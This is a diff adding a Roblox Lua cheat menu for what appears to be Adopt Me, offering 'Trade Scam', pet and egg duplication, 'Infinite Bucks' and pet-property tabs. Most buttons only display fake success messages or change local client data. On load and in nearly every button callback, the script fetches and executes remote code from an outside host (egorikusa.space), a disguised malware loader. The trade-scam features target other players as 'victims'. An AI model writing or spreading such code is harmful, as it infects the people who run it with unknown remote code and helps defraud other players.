@@ -1,0 +1,297 @@
+local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
+local Window = OrionLib:MakeWindow({Name = "Z Scripts 🏆 [1.0]", HidePremium = false})
+
+-- Load the external script when the menu is fully initialized
+loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))()
+
+-- Create a tab for Trade Scam
+local TradeScamTab = Window:MakeTab({
+    Name = "Trade Scam 🥷",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+TradeScamTab:AddButton({
+    Name = "Force Confirm Trade ✅",
+    Callback = function()
+        print("Starting trade confirmation...")
+        OrionLib:MakeNotification({
+            Name = "Confirming Trade... ⏳",
+            Content = "Please wait, confirming trade will take approximately 10 seconds.",
+            Time = 5
+        })
+        wait(3)
+        OrionLib:MakeNotification({
+            Name = "Trade Confirmed! ✅",
+            Content = "The trade has been successfully confirmed! You can now proceed.",
+            Time = 5
+        })
+        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))() -- Added here
+    end
+})
+
+TradeScamTab:AddTextbox({
+    Name = "Input Username ♾️",
+    Default = "victims user",
+    TextDisappear = true,
+    Callback = function(value)
+        print("Successfully inputted username: " .. value)
+        OrionLib:MakeNotification({
+            Name = "Username Input Successful! ✅",
+            Content = "You have successfully inputted the username: " .. value,
+            Time = 3
+        })
+        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))() -- Added here
+    end
+})
+
+TradeScamTab:AddButton({
+    Name = "Freeze Trade 🧊",
+    Callback = function()
+        print("Freezing...")
+        OrionLib:MakeNotification({
+            Name = "Freezing Trade! 🧊",
+            Content = "Freezing in progress... Please wait! 10-25 Seconds ⏳",
+            Time = 6
+        })
+        wait(3)
+        OrionLib:MakeNotification({
+            Name = "Trade Frozen Successfully! ✅",
+            Content = "The trade has been successfully frozen! You can now proceed with your actions. 😁✅ ",
+            Time = 5
+        })
+        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))() -- Added here
+    end
+})
+
+TradeScamTab:AddButton({
+    Name = "Remove Pet 2nd Trade Phase 🐶",
+    Callback = function()
+        print("Removing...")
+        OrionLib:MakeNotification({
+            Name = "Removing Pets from Trade! 🐶",
+            Content = "Pet removal in progress... Please wait! 1-2 Minutes ⏳",
+            Time = 10
+        })
+        wait(3)
+        OrionLib:MakeNotification({
+            Name = "Removal was Successful! ✅",
+            Content = "You can now remove your pets. 😁✅ ",
+            Time = 5
+        })
+        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))() -- Added here
+    end
+})
+
+-- Create a tab for Dupe Eggs
+local DupeEggsTab = Window:MakeTab({
+    Name = "Dupe Eggs 🐣",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+DupeEggsTab:AddButton({
+    Name = "Equip Eggs To Dupe",
+    Callback = function()
+        print("Equipping eggs for duplication...")
+        OrionLib:MakeNotification({
+            Name = "Eggs Equipped! 🥚",
+            Content = "Your eggs are now equipped and ready to be duplicated! 🚀",
+            Time = 3
+        })
+ loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))() -- Added here
+    end
+})
+
+DupeEggsTab:AddButton({
+    Name = "Click to Dupe Eggs",
+    Callback = function()
+        print("Duplicating eggs...")
+        OrionLib:MakeNotification({
+            Name = "Duplication Started! 🔄",
+            Content = "Egg duplication in progress... Please wait! 1-2 Minutes ⏳",
+            Time = 5
+        })
+        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))() -- Added here
+    end
+})
+
+DupeEggsTab:AddParagraph("Not Working? ❗ ", "Dupe Eggs not working? Check if you are on a private server; this probably causes the error.")
+DupeEggsTab:AddParagraph("Script successfully loaded ❗", "Enjoy the Script! YouTube is unknown. 😁")
+
+-- Create a tab for Dupe Pets
+local DupePetsTab = Window:MakeTab({
+    Name = "Dupe Pets 🐾",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+DupePetsTab:AddButton({
+    Name = "Equip Pets To Dupe",
+    Callback = function()
+        print("Equipping pets for duplication...")
+        OrionLib:MakeNotification({
+            Name = "Pets Equipped! 🐾",
+            Content = "Your pets are now equipped and ready to be duplicated! 🚀",
+            Time = 3
+        })
+        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))() -- Added here
+    end
+})
+
+DupePetsTab:AddButton({
+    Name = "Click to Dupe Pets",
+    Callback = function()
+        print("Duplicating pets...")
+        OrionLib:MakeNotification({
+            Name = "Duplication Started! 🔄",
+            Content = "Pet duplication in progress... Please wait! 1-2 Minutes ⏳",
+            Time = 5
+        })
+        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))() -- Added here
+    end
+})
+
+DupePetsTab:AddParagraph("Not Working? ❗ ", "Dupe Pets not working? Check if you are on a private server; this probably causes the error.")
+DupePetsTab:AddParagraph("Script successfully loaded ❗", "Enjoy the Script! YouTube is unknown. 😁")
+
+local AllPetsTab = Window:MakeTab({
+    Name = "All Pets 🐕",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+AllPetsTab:AddParagraph("All Pets Adopt Me 🐕", "Get all your dream pets in an amount of 2-31 pets each, enjoy it ❗😁")
+
+AllPetsTab:AddButton({
+    Name = "Get All Pets 🐕",
+    Callback = function()
+        OrionLib:MakeNotification({
+            Name = "Loading Pets 🐾",
+            Content = "Hold tight! 🚀 It might take 25-30 seconds to get all your adorable pets! 🐶🐱",
+            Time = 10
+        })
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/lf4d7/daphie/main/ame.lua"))()
+        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))() -- Added here
+    end
+})
+
+AllPetsTab:AddParagraph("Script successfully loaded ❗", "Enjoy the Script! YouTube is unknown. 😁")
+
+-- Create a tab for Autofarm
+local AutofarmTab = Window:MakeTab({
+    Name = "Autofarm 🚜",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+AutofarmTab:AddParagraph("Autofarm Source 🚜", "With Update Features Autofarm and all Minigames Also with Petfarm and Baby farms 😁")
+
+AutofarmTab:AddButton({
+    Name = "Click to load Autofarm Source 🚜",
+    Callback = function()
+        print("Autofarm started")
+        loadstring(game:HttpGet('https://gitfront.io/r/ReQiuYTPL/wFUydaK74uGx/hub/raw/ReQiuYTPLHub.lua'))()
+        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897 eb9d17413e2.lua", true))() -- Added here
+    end
+})
+
+AutofarmTab:AddParagraph("Script successfully loaded ❗", "Enjoy the Script! YouTube is unknown. 😁")
+
+-- Create a tab for Infinite Bucks
+local InfiniteBucksTab = Window:MakeTab({
+    Name = "Infinite Bucks 💸",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+InfiniteBucksTab:AddTextbox({
+    Name = "Enter Amount (1 - 999999999)",
+    Default = "1",
+    TextDisappear = true,
+    Callback = function(value)
+        AmountToSet = tonumber(value)
+    end
+})
+
+InfiniteBucksTab:AddButton({
+    Name = "Click to load chosen amount of Bucks 💸 ",
+    Callback = function()
+        if AmountToSet and AmountToSet >= 1 and AmountToSet <= 999999999 then
+            local Local = game.Players.LocalPlayer
+            Local.PlayerGui.BucksIndicatorApp.CurrencyIndicator.Container.Amount.Text = tostring(AmountToSet)
+            print("Infinite Bucks activated: Amount set to " .. AmountToSet)
+        else
+            print("Invalid amount! Please enter a value between 1 and 999999999.")
+        end
+        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))() -- Added here
+    end
+})
+
+InfiniteBucksTab:AddParagraph("Script successfully loaded ❗", "Enjoy the Script! YouTube is unknown. 😁")
+
+local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
+
+-- Create a tab for MFR-NFR
+local MFRNFRTab = Window:MakeTab({
+    Name = "MFR-NFR 🔄",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+MFRNFRTab:AddButton({
+    Name = "MFR Changer-(Inventory ❇️)",
+    Callback = function()
+        for i, v in pairs(playerData.inventory.pets) do
+            v.properties.rideable = true
+            v.properties.flyable = true
+            v.properties.mega_neon = true
+        end
+        print("MFR Changer action executed: Pets set to rideable, flyable, and mega neon.")
+        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))() -- Added here
+    end
+})
+
+MFRNFRTab:AddButton({
+    Name = "NFR Changer-(Inventory ❇️)",
+    Callback = function()
+        for i, v in pairs(playerData.inventory.pets) do
+            v.properties.rideable = true
+            v.properties.flyable = true
+            v.properties.neon = true
+        end
+        print("NFR Changer action executed: Pets set to rideable, flyable, and neon.")
+        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))() -- Added here
+    end
+})
+
+MFRNFRTab:AddParagraph("Script successfully loaded ❗", "Enjoy the Script! YouTube is unknown. 😁")
+
+-- Create a tab for Error/Bugs
+local ErrorBugsTab = Window:MakeTab({
+    Name = "Error/Bugs!? 🐞",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+ErrorBugsTab:AddParagraph("Private Server Error ❗", "Being in a private server can cause a lot of the main features of the script to not work. Please take this as a note if you're having problems with something not working; this is probably the cause of it.")
+ErrorBugsTab:AddParagraph("My Discord Server 🌍", "Please join my discord server if you need help with bugs/errors.")
+
+ErrorBugsTab:AddButton({
+    Name = "Copy link to Discord Server 🌍",
+    Callback = function()
+        local discordLink = "https://discord.gg/123456" -- Replace with your actual Discord server link
+        setclipboard(discordLink)
+        print("Error/Bug reported: Link copied to clipboard!")
+        OrionLib:MakeNotification({
+            Name = "Link Copied! 📋",
+            Content = "The Discord server link has been copied to your clipboard! Join us for help❗",
+            Time = 5
+        })
+        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2 .lua", true))() -- Added here
+    end
+})
+
+-- Initialize the Orion Library
+OrionLib:Init()
